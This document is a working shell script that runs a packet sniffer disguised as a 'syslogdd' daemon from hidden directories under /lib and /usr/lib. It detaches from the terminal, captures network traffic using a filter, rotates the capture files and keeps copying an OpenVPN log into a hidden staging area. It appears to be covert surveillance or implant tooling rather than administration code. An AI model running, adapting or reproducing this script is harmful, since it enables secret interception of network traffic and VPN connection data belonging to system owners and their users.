#!/bin/sh
#Mon Apr  5 11:35:30 EDT 2010
BINDIR=/lib/.dccac5f15d079735
export PATH=$BINDIR:/sbin:/usr/sbin:/bin:/usr/bin
INTF=3
LOOPCOUNT=3600
PREFIX=tc
MEGPERFILE=5

# DATADIR STUFF
DATADIR=/usr/lib/.dccac5f15d079736/t/t
# MAXFILES2 is the max number of files script will allow to reside in DATADIR
MAXFILES2=601

# WORKDIR STUFF
WORKDIR=$(cd $DATADIR/.. ; pwd)
# MAXFILES is most files syslogdd will create in WORKDIR
MAXFILES=100

# GETTHIS STUFF
GETFILE=/usr/local/openvpn/openvpn.log
DUPEFILE=openvpn.log

cd $WORKDIR
pwd
if [ ! -d $DATADIR ]  ; then
    echo mkdir -p `pwd`/$DATADIR
    echo -e "\n\ndirectory $DATADIR must already exist: \n" `ls -alrt $DATADIR`
    exit 1
fi
if [ ! -x $BINDIR/syslogdd ] ; then
    echo -e "\n\n$BINDIR/syslogdd must be executable"
    exit 2
fi
if [ ! -s 1 ] ; then
    echo -e "\n\nYou must put your filter in ./1"
    exit 3
fi

C=5
    C2=$((C-1))

echo -e "\n\nC2=$C2 Sniffing on $INTF for: `cat 1`"

echo PATH=$PATH
chgrp -R pcap $WORKDIR 2>/dev/null
chmod -R ug+rwX $WORKDIR

MTOT=`echo "($MAXFILES+$MAXFILES2)*$MEGPERFILE" | bc`
GTOT=`echo "($MAXFILES+$MAXFILES2)*$MEGPERFILE/1024" | bc`
AVAIL=`df -h $WORKDIR | grep / | tr '\n' ' ' | awk '{print $4}' | tr -d 'a-zA-Z'`
MAX=`echo $AVAIL/10 | bc`

echo -e "\n\nWill tie up at most ${MTOT}M (${GTOT}G) of space in $WORKDIR (which has ${AVAIL}G available)"
df -h $WORKDIR

if [ $GTOT -gt $MAX ] ; then
    echo -e "\n\nTHAT IS TOO MUCH (more than 1/10th) EXITING BEFORE RUNNING ANYTHING"
    exit 4
fi

CMD="syslogdd -p -i $INTF -F 1 -W $MAXFILES -C $MEGPERFILE -s 0 -w ${PREFIX} -n"
echo -e "\n\nnow running \"$CMD\""
ls -al 1
which syslogdd

exec 0>&- >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&- 
$CMD &
T=$?


if [ ! "$T" = "0" ] ; then
    echo ERR: syslogdd returned $T > $WORKDIR/t.err
    exit $T
fi
sleep 3
LOGLINES=0
while [ 1 ] ; do 
    cd $WORKDIR || break
    C=`ls -Art1 ${PREFIX}* 2>/dev/null | wc -l`
    C2=$((C-1)) 
    if [ $C2 -gt 0 ] ; then
        #mv -v `ls -Art1 $WORKDIR/${PREFIX}* 2>/dev/null | head -$C2` $DATADIR
        D=`date +%Y%m%d-%H%M`
        for f in `ls -Art1 ${PREFIX}* 2>/dev/null | head -$C2` ; do
            [ "$f" = "1" ] && continue
            [ "$f" = "t" ] && continue
            mv -v $f $DATADIR/$D.$f
        done
    fi
    if [ -f "$GETFILE" ] ; then
        NEWLINES=`cat $GETFILE 2>/dev/null | wc -l`
        if [ $NEWLINES -lt $LOGLINES ] ; then
            COU=0
            if [ -f $DATADIR/$DUPEFILE ] ; then
                while [ 1 ] ; do 
                    COU=$((COU+1))
                    [ -f $DATADIR/$DUPEFILE.$COU ] && continue
                    break
                done
                mv -v $DATADIR/$DUPEFILE $DATADIR/$DUPEFILE.$COU
            fi
            cat  $GETFILE > $DATADIR/$DUPEFILE
            NEWLINES=`cat $DATADIR/$DUPEFILE 2>/dev/null | wc -l`
        elif [ $NEWLINES -gt $LOGLINES ] ; then
            TAILLINES=`echo $NEWLINES-$LOGLINES | bc`
            tail -$TAILLINES $GETFILE >> $DATADIR/$DUPEFILE
        fi
        LOGLINES="$NEWLINES"
        echo LOGLINES IS NOW $LOGLINES
    fi
    cd $DATADIR || break
    # Just in case somehow DATADIR gets nulled:
    [ "$DATADIR" ] || break  
    # Remove if too many files, more than $MAXFILES2-1 files
    COU=`ls -At1 *.${PREFIX}* 2>/dev/null | wc -l`
    COU=$((COU-$MAXFILES2))
    if [ $COU -gt 0 ] ; then
        echo Removing excess $COU files, leaving $MAXFILES2
        for f in `ls -At1 *.${PREFIX}* 2>/dev/null | tail -$COU` ; do
            rm -v $f
        done
    fi

    sleep $LOOPCOUNT
    [ -d $WORKDIR ] || break
done

